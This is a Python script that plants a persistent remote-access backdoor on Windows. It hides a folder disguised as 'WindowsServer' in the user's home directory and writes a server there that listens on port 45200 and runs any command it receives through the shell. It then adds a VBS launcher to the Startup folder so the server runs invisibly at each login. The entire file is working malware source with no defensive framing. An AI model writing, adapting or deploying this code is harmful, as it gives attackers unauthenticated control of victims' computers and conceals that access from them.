import os
import sys

# Get the current logged-in user's username
user = os.getlogin()

# Define the startup folder path for the current user
startup_path = fr"C:/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

# Get the current working directory (where the script is running)
cwd = os.getcwd()

# Server code content that will be written to server.py
server_content = r'''
import socket
import subprocess
import os
host = "0.0.0.0"
port = 45200

# Function to send command output back to the client
def send_exe(command,conn):
    # Execute the command and capture the output
    process = subprocess.Popen(command,
                            shell=True,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            stdin=subprocess.PIPE,
                            text=True)
    output = str(process.stdout.read() + process.stderr.read() + str(os.getcwd())+">")
    print(output)
    print(len(output))
    
    # Send the length of the output first
    conn.send(str(len(output)).encode())
    
    # Send the output in chunks of 10 characters
    if len(output)<10:
        conn.send(str.encode(output))
    else:
        iterations = len(output)//10
        j = 0
        for i in range(0,iterations):
            conn.send(output[j:j+10].encode())
            j+=10
        if len(output) % 10 != 0:
            conn.send(output[10*iterations:].encode())

# Set up the server socket
client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client.bind((host,port))
client.listen(1)

print("listening...")
conn,address = client.accept()
print("connected.")
conn.send("connected".encode())

# Main loop to receive and execute commands
while True:
    command = conn.recv(4096).decode()
    try:
        if command.lower() == "exit":
            break
        if command.lower().startswith("cd ") and len(command)>4:
            os.chdir(command[3:])
        if len(command)> 0 :
            send_exe(command,conn)
    except:
        size = len("invalid")
        conn.send(str(size).encode())
        conn.send(str.encode("invalid"))
client.close()
conn.close()
'''

# Batch file content that will run the server.py script
batch_content = fr'''"{sys.executable}" "C:/Users/{user}/WindowsServer/server.py"'''

# VBS script content to hide the command window when running the batch file
vbs_content = fr'''
set code = CreateObject("WScript.shell")
code.Run "C:/Users/{user}/WindowsServer/server.bat",0,False
'''

# Change directory to the user's home folder
os.chdir(f"C:/Users/{user}")

# Create a hidden folder named "WindowsServer"
os.mkdir("WindowsServer")
os.system("attrib +h WindowsServer")

# Change directory to the newly created folder
os.chdir(f"C:/Users/{user}/WindowsServer")

# Write the server code to server.py
with open("server.py",'w') as f:
    f.write(server_content)

# Write the batch file content to server.bat
with open("server.bat",'w') as f:
    f.write(batch_content)

# Change directory to the startup folder
os.chdir(startup_path)

# Write the VBS script to winServ.vbs
with open("winServ.vbs",'w') as f:
    f.write(vbs_content)
